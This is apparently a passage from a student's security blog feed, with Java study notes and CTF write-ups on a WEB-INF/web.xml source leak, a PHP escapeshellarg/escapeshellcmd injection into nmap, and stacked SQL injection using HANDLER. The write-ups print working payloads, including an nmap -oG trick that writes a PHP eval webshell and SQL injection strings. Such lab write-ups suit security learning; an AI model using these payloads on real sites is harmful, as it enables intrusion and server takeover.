Map|用户行为|可视化重现"></p><p>编译型语言与解释型语言区别</p><p><img src="/2021/03/26/java%E5%BC%80%E5%8F%91%E7%8E%AF%E5%A2%83%E5%87%86%E5%A4%87/image-20210326221441804.png" class="lazyload" data-srcset="/2021/03/26/java%E5%BC%80%E5%8F%91%E7%8E%AF%E5%A2%83%E5%87%86%E5%A4%87/image-20210326221441804.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image-20210326221441804"></p><p>简单讲就是编译型将源码一下子转换成可执行的机器语言，然后执行。而解释型语言一条一条转换成底层语言再执行</p><h3 id="IDEA的使用"><a href="#IDEA的使用" class="headerlink" title="IDEA的使用"></a>IDEA的使用</h3><p>非常舒适的界面</p><p><img src="/2021/03/26/java%E5%BC%80%E5%8F%91%E7%8E%AF%E5%A2%83%E5%87%86%E5%A4%87/image-20210326230025739.png" class="lazyload" data-srcset="/2021/03/26/java%E5%BC%80%E5%8F%91%E7%8E%AF%E5%A2%83%E5%87%86%E5%A4%87/image-20210326230025739.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image-20210326230025739"></p>]]></content>
      
      
      <categories>
          
          <category> java学习之路 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> java </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>终究走上了java这条路</title>
      <link href="2021/03/26/%E7%BB%88%E7%A9%B6%E8%B5%B0%E4%B8%8A%E4%BA%86java%E8%BF%99%E6%9D%A1%E8%B7%AF/"/>
      <url>2021/03/26/%E7%BB%88%E7%A9%B6%E8%B5%B0%E4%B8%8A%E4%BA%86java%E8%BF%99%E6%9D%A1%E8%B7%AF/</url>
      
        <content type="html"><![CDATA[<p>最终还是走向了java这条路，那就坚持下去，在此记录下自己的初心。碎碎念~</p><span id="more"></span><h3 id="为什么选择系统学习编程"><a href="#为什么选择系统学习编程" class="headerlink" title="为什么选择系统学习编程"></a>为什么选择系统学习编程</h3><p>作为一名想要从事网络安全行业的信息安全学生，我在大一就开始参加一下较为简单的ctf比赛，参与比赛多了基本能看懂php、java的后端代码，从而分析漏洞，利用漏洞。截止目前，我现在大二下学期，web漏洞原理烂熟于心，单个利用点的一些绕过方式也基本掌握，一些工具的使用也没问题。但是做一些代码审计工程，比如直接拖一个站的源码审计的时候，总是看不下去。想起了大一当时对着代码审计基础题一个函数一个函数查的时光，感觉自己好像变懒了，或者说这么长时间了，还不会代码有些失望，甚至随着审计量的上升对源码有种无力感。为了不甘于当一个脚本小子，一个只懂原理的用别人工具的伸手党，也是为能够审计庞大的代码量，我决定从基础开始补编程的基础。</p><h4 id="为什么选择java这门语言"><a href="#为什么选择java这门语言" class="headerlink" title="为什么选择java这门语言"></a>为什么选择java这门语言</h4><p>目前的自己，不管怎么说不可能说对编程一无所知。python本身审计过简单的flask站点，而且能够拿python写一些基础的爬虫或者一些exp脚本。但是真的很基础，以至于我当时对团队师傅分享的多线程awd脚本分析了好久。也通过python调用一些api接口，写过挂代理ip池的爬虫。但是感觉python这门语言什么都能做的背后，忽略了接口后面程序的原理。从长远来看，python更侧重一些非计算机专业的人或者从事科学研究的人使用，想要在web层看到程序背后的开发者的想法，自然更倾向于学习一门后端开发的语言。同时java作为安卓程序开发的一门语言对于从事移动安全研究也很有帮助，于是我选择了java。而且我觉得java能学好只有，学习一些其他的后端编程语言应该也很快，比如php、ruby。我学习java的目的，主要方向是代码审计，其次是能够通过java写一些好用的安全工具，点亮安全开发的技能树。</p><h4 id="怎么系统学习java"><a href="#怎么系统学习java" class="headerlink" title="怎么系统学习java"></a>怎么系统学习java</h4><p>我选择跟着b站的狂神师傅学java栈的开发技术，因为在我前面学习docker的时候就以狂神的课为基础，感觉这个老师精于技术的同时又是一名话语背后透露着思想光芒的理想主义者，而且他觉得好的教育不是灌输，而是点燃火焰。感觉很有共鸣。</p><p>我也相信，只要像sb一样坚持，终将牛逼。</p>]]></content>
      
      
      <categories>
          
          <category> java学习之路 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>[RoarCTF 2019]Easy Java</title>
      <link href="2021/03/24/RoarCTF-2019-Easy-Java/"/>
      <url>2021/03/24/RoarCTF-2019-Easy-Java/</url>
      
        <content type="html"><![CDATA[<p>WEB-INF/web.xml 这个点由于对javaweb不熟悉清楚，记录下</p><span id="more"></span><h3 id="0x01-前置知识"><a href="#0x01-前置知识" class="headerlink" title="0x01 前置知识"></a>0x01 前置知识</h3><p>WEB-INF是什么</p><blockquote><p>WEB-INF是Java的WEB应用的安全目录。所谓安全就是客户端无法访问，只有服务端可以访问的目录。如果想在页面中直接访问其中的文件，必须通过web.<a href="https://baike.baidu.com/item/xml%E6%96%87%E4%BB%B6/1994443">xml文件</a>对要访问的文件进行相应映射才能访问。</p></blockquote><p>WEB-INF简单理解为java web下的一种安全机制，WEB-INF 目录下的东西只能通过web.xml做相应映射才能让客户端访问</p><p>此目录下常有</p><blockquote><p>/WEB-INF/web.xml   Web应用程序配置文件，描述了 servlet 和其他的应用组件配置及命名规则</p><p>/WEB-INF/classes/ 包含了站点所有用的 class 文件，包括 servlet class 和非servlet class，他们不能包含在 .jar文件中（是该目录不能包含在.jar文件中）。</p><p>/WEB-INF/lib/  存放web应用需要的各种JAR文件，放置仅在这个应用中要求使用的jar文件,如数据库驱动jar文件。</p><p>/WEB-INF/src/ 　源码目录，按照包名结构放置各个java文件。</p><p>/WEB-INF/database.properties  数据库配置文件</p><p>/WEB-INF/tags/ 存放了自定义标签文件，该目录并不一定为 tags，可以根据自己的喜好和习惯为自己的标签文件库命名</p><p>/WEB-INF/jsp/ jsp 1.2 以下版本的文件存放位置。</p><p>/WEB-INF/jsp2/   jsp 文件目录相比，该目录下主要存放 Jsp 2.0 以下版本的文件</p><p>META-INF 相当于一个信息包，目录中的文件和目录获得Java 2平台的认可与解释，用来配置应用程序、扩展程序、类加载器和服务</p><p>manifest.mf文件，在用jar打包时自动生成</p></blockquote><p>在ctf中 有一种常见的源码泄露方式为 WEB-INF/web.xml </p><p>漏洞检测以及利用方法：<strong>通过找到web.xml文件，推断class文件的路径，最后直接class文件，在通过反编译class文件，得到网站源码。</strong></p><p>这种漏洞的成因主要是映射配置不当</p><p>0x02 解题</p><p><img src="/2021/03/24/RoarCTF-2019-Easy-Java/image-20210324155013651.png" class="lazyload" data-srcset="/2021/03/24/RoarCTF-2019-Easy-Java/image-20210324155013651.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image-20210324155013651"></p><p>一个登入框 尝试弱口令 admin/admin888成功</p><p><img src="/2021/03/24/RoarCTF-2019-Easy-Java/image-20210324155050648.png" class="lazyload" data-srcset="/2021/03/24/RoarCTF-2019-Easy-Java/image-20210324155050648.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image-20210324155050648"></p><p>看来跟这里没关系</p><p><img src="/2021/03/24/RoarCTF-2019-Easy-Java/image-20210324155120007.png" class="lazyload" data-srcset="/2021/03/24/RoarCTF-2019-Easy-Java/image-20210324155120007.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image-20210324155120007"></p><p><img src="/2021/03/24/RoarCTF-2019-Easy-Java/image-20210324155129475.png" class="lazyload" data-srcset="/2021/03/24/RoarCTF-2019-Easy-Java/image-20210324155129475.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image-20210324155129475"></p><p>应该是个文件包含的点，但是get传参总是报错</p><p><img src="/2021/03/24/RoarCTF-2019-Easy-Java/image-20210324155235740.png" class="lazyload" data-srcset="/2021/03/24/RoarCTF-2019-Easy-Java/image-20210324155235740.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image-20210324155235740"></p><p><img src="/2021/03/24/RoarCTF-2019-Easy-Java/image-20210324155313286.png" class="lazyload" data-srcset="/2021/03/24/RoarCTF-2019-Easy-Java/image-20210324155313286.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image-20210324155313286"></p><p>对class下目录进行猜测得到</p><p><img src="/2021/03/24/RoarCTF-2019-Easy-Java/image-20210324155710289.png" class="lazyload" data-srcset="/2021/03/24/RoarCTF-2019-Easy-Java/image-20210324155710289.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image-20210324155710289"></p><p><img src="/2021/03/24/RoarCTF-2019-Easy-Java/image-20210324155817744.png" class="lazyload" data-srcset="/2021/03/24/RoarCTF-2019-Easy-Java/image-20210324155817744.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image-20210324155817744"></p><p>base64解码即为flag</p>]]></content>
      
      
      <categories>
          
          <category> ctf-Write up </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 源码泄露 </tag>
            
            <tag> java </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>[BUUCTF 2018]Online Tool</title>
      <link href="2021/03/19/BUUCTF-2018-Online-Tool/"/>
      <url>2021/03/19/BUUCTF-2018-Online-Tool/</url>
      
        <content type="html"><![CDATA[<p>算是一道考点比较清晰的题，利用两个php中防止命令注入的函数搭配不当，而今造成过滤无效，产生命令执行</p><h3 id="0x01-源代码分析"><a href="#0x01-源代码分析" class="headerlink" title="0x01 源代码分析"></a>0x01 源代码分析</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_SERVER</span>[<span class="string">&#x27;HTTP_X_FORWARDED_FOR&#x27;</span>])) &#123;</span><br><span class="line">    <span class="variable">$_SERVER</span>[<span class="string">&#x27;REMOTE_ADDR&#x27;</span>] = <span class="variable">$_SERVER</span>[<span class="string">&#x27;HTTP_X_FORWARDED_FOR&#x27;</span>];</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(!<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;host&#x27;</span>])) &#123;</span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="variable">$host</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;host&#x27;</span>];</span><br><span class="line">    <span class="variable">$host</span> = escapeshellarg(<span class="variable">$host</span>);</span><br><span class="line">    <span class="variable">$host</span> = escapeshellcmd(<span class="variable">$host</span>);</span><br><span class="line">    <span class="variable">$sandbox</span> = md5(<span class="string">&quot;glzjin&quot;</span>. <span class="variable">$_SERVER</span>[<span class="string">&#x27;REMOTE_ADDR&#x27;</span>]);</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&#x27;you are in sandbox &#x27;</span>.<span class="variable">$sandbox</span>;</span><br><span class="line">    @mkdir(<span class="variable">$sandbox</span>);</span><br><span class="line">    chdir(<span class="variable">$sandbox</span>);</span><br><span class="line">    <span class="keyword">echo</span> system(<span class="string">&quot;nmap -T5 -sT -Pn --host-timeout 2 -F &quot;</span>.<span class="variable">$host</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>考点显然就是</p><blockquote><p>escapeshellarg函数</p><p>escapeshellcmd函数</p></blockquote><p><img src="/2021/03/19/BUUCTF-2018-Online-Tool/image-20210319231510695.png" class="lazyload" data-srcset="/2021/03/19/BUUCTF-2018-Online-Tool/image-20210319231510695.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image-20210319231510695"></p><p><img src="/2021/03/19/BUUCTF-2018-Online-Tool/image-20210319231543251.png" class="lazyload" data-srcset="/2021/03/19/BUUCTF-2018-Online-Tool/image-20210319231543251.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image-20210319231543251"></p><h3 id="0x02-漏洞分析"><a href="#0x02-漏洞分析" class="headerlink" title="0x02 漏洞分析"></a>0x02 漏洞分析</h3><p>根据博文 <a href="https://paper.seebug.org/164/">https://paper.seebug.org/164/</a></p><p>我分别在本地php7.3，php5.5.9，php5.2 环境下简单调试一下这两个函数</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$param</span>=<span class="string">&quot;127.0.0.1&#x27; -v -d a=1&quot;</span>;</span><br><span class="line"><span class="variable">$a</span>=escapeshellarg(<span class="variable">$param</span>);</span><br><span class="line"><span class="variable">$b</span>=escapeshellcmd(<span class="variable">$a</span>);</span><br><span class="line"><span class="variable">$cmd</span> =<span class="string">&quot;curl &quot;</span>.<span class="variable">$b</span>;</span><br><span class="line">var_dump(<span class="variable">$a</span>).<span class="string">&quot;\n&quot;</span>;</span><br><span class="line">var_dump(<span class="variable">$b</span>).<span class="string">&quot;\n&quot;</span>;</span><br><span class="line">var_dump(<span class="variable">$cmd</span>).<span class="string">&quot;\n&quot;</span>;</span><br><span class="line">system(<span class="variable">$cmd</span>);</span><br></pre></td></tr></table></figure><p>php7.3</p><p><img src="/2021/03/19/BUUCTF-2018-Online-Tool/image-20210319235845982.png" class="lazyload" data-srcset="/2021/03/19/BUUCTF-2018-Online-Tool/image-20210319235845982.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image-20210319235845982"></p><p>php5.5</p><p><img src="/2021/03/19/BUUCTF-2018-Online-Tool/image-20210319235807470.png" class="lazyload" data-srcset="/2021/03/19/BUUCTF-2018-Online-Tool/image-20210319235807470.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image-20210319235807470"></p><p>php5.2</p><p><img src="/2021/03/19/BUUCTF-2018-Online-Tool/image-20210319235253373.png" class="lazyload" data-srcset="/2021/03/19/BUUCTF-2018-Online-Tool/image-20210319235253373.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image-20210319235253373"></p><p>由于低版本的php特殊的处理方式造成了此漏洞</p><h3 id="0x03-payload构造"><a href="#0x03-payload构造" class="headerlink" title="0x03 payload构造"></a>0x03 payload构造</h3><p><code>nmap -T5 -sT -Pn --host-timeout 2 -F</code> 这一命令实在 对部分常用端口特别快的进行tcp扫描，并且默认主机存活。</p><p>我们想办法构造一个webshell </p><blockquote><p><code>-oG test.txt</code>: 将扫描结果生成 test.txt 文件</p></blockquote><p>我们可以尝试将 webshell写入 文件，访问文件从而控制web服务</p><p>于是我们要构造型入 <code>&#39; &lt;?php @eval($_GET[&quot;M0th&quot;]);?&gt; -oG hacker.php &#39;</code>的字符串</p><p>测试发现并不需要什么过滤就可以执行</p><p><img src="/2021/03/19/BUUCTF-2018-Online-Tool/image-20210320001405174.png" class="lazyload" data-srcset="/2021/03/19/BUUCTF-2018-Online-Tool/image-20210320001405174.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image-20210320001405174"></p><p><img src="/2021/03/19/BUUCTF-2018-Online-Tool/image-20210320001442557.png" class="lazyload" data-srcset="/2021/03/19/BUUCTF-2018-Online-Tool/image-20210320001442557.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image-20210320001442557"></p>]]></content>
      
      
      <categories>
          
          <category> ctf-Write up </category>
          
      </categories>
      
      
        <tags>
            
            <tag> php漏洞 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>[GYCTF2020]Blacklist</title>
      <link href="2021/03/14/GYCTF2020-Blacklist/"/>
      <url>2021/03/14/GYCTF2020-Blacklist/</url>
      
        <content type="html"><![CDATA[<p>这个题可以说是强网杯随便注2.0了吧</p><span id="more"></span><h3 id="0x01前置知识"><a href="#0x01前置知识" class="headerlink" title="0x01前置知识"></a>0x01前置知识</h3><p>mysql文档中有一种新的读取数据的方法，号称比select快<a href="https://dev.mysql.com/doc/refman/8.0/en/handler.html">文档</a></p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">HANDLER tbl_name <span class="keyword">OPEN</span> [ [<span class="keyword">AS</span>] alias]</span><br><span class="line"></span><br><span class="line">HANDLER tbl_name READ index_name &#123; = | &lt;= | &gt;= | &lt; | &gt; &#125; (value1,value2,...)</span><br><span class="line">    [ <span class="keyword">WHERE</span> where_condition ] [LIMIT ... ]</span><br><span class="line">HANDLER tbl_name READ index_name &#123; FIRST | NEXT | PREV | LAST &#125;</span><br><span class="line">    [ <span class="keyword">WHERE</span> where_condition ] [LIMIT ... ]</span><br><span class="line">HANDLER tbl_name READ &#123; FIRST | NEXT &#125;</span><br><span class="line">    [ <span class="keyword">WHERE</span> where_condition ] [LIMIT ... ]</span><br><span class="line"></span><br><span class="line">HANDLER tbl_name <span class="keyword">CLOSE</span></span><br></pre></td></tr></table></figure><h3 id="0x02信息收集"><a href="#0x02信息收集" class="headerlink" title="0x02信息收集"></a>0x02信息收集</h3><p><img src="/2021/03/14/GYCTF2020-Blacklist/image-20210317213251303.png" class="lazyload" data-srcset="/2021/03/14/GYCTF2020-Blacklist/image-20210317213251303.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image-20210317213251303"></p><p>sql注入,<code>&#39;</code>测试发现字符型注入</p><p>测试联合注入 </p><p><img src="/2021/03/14/GYCTF2020-Blacklist/image-20210317213430167.png" class="lazyload" data-srcset="/2021/03/14/GYCTF2020-Blacklist/image-20210317213430167.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image-20210317213430167"></p><p>部分sql语句关键字被过滤 ，构造报错注入也被过滤</p><p><img src="/2021/03/14/GYCTF2020-Blacklist/image-20210317213608533.png" class="lazyload" data-srcset="/2021/03/14/GYCTF2020-Blacklist/image-20210317213608533.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image-20210317213608533"></p><p>真和强网杯随便注差不多，开始堆叠注入</p><p><code>1&#39;;show databases;</code></p><p><img src="/2021/03/14/GYCTF2020-Blacklist/image-20210317213718062.png" class="lazyload" data-srcset="/2021/03/14/GYCTF2020-Blacklist/image-20210317213718062.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image-20210317213718062"></p><p><code>1&#39;;use ctftraining;show columns from FLAG_TABLE;</code></p><p><img src="/2021/03/14/GYCTF2020-Blacklist/image-20210317214256774.png" class="lazyload" data-srcset="/2021/03/14/GYCTF2020-Blacklist/image-20210317214256774.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image-20210317214256774"></p><p>显然flag并没有在这里</p><p><code>1&#39;;show tables from supersqli;</code> 换库</p><p><img src="/2021/03/14/GYCTF2020-Blacklist/image-20210317214409552.png" class="lazyload" data-srcset="/2021/03/14/GYCTF2020-Blacklist/image-20210317214409552.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image-20210317214409552"></p><p><code>1&#39;;use supersqli;show columns from  FlagHere;</code></p><p><img src="/2021/03/14/GYCTF2020-Blacklist/image-20210317214549737.png" class="lazyload" data-srcset="/2021/03/14/GYCTF2020-Blacklist/image-20210317214549737.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image-20210317214549737"></p><p>想办法读这个flag，通过<a href="http://m0th.top/2019/12/04/%E5%BC%BA%E7%BD%91%E6%9D%AF-%E9%9A%8F%E4%BE%BF%E6%B3%A8/">强网杯随便注</a>一题的学习,我们应该可以有两种方式来读数据</p><p>一种是通过alter替换表名的方式通过现在这个查询数据的接口出来，显然这种方式并不能成立因为alter被ban掉了</p><p>于是我们来看看预编译还能做的通吗</p><p>prepared函数被ban掉</p><p>简单看一下预处理的语法</p><blockquote><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"># 定义预处理语句</span><br><span class="line">PREPARE stmt_name FROM preparable_stmt;</span><br><span class="line"># 执行预处理语句</span><br><span class="line">EXECUTE stmt_name [USING @var_name [, @var_name] ...];</span><br><span class="line"># 删除(释放)定义</span><br><span class="line">&#123;DEALLOCATE | DROP&#125; PREPARE stmt_name;</span><br></pre></td></tr></table></figure></blockquote><p>我么需要预处理的语句是 <code>select flag from FlagHere</code></p><p>必然需要用到 prepared函数于是也没了</p><p>0x03 payload</p><p>根据前置知识，我们构造如下payload</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1&#x27;;handler FlagHere open;handler FlagHere read first;handler FlagHere close</span><br></pre></td></tr></table></figure><p><img src="/2021/03/14/GYCTF2020-Blacklist/image-20210317220933322.png" class="lazyload" data-srcset="/2021/03/14/GYCTF2020-Blacklist/image-20210317220933322.png" 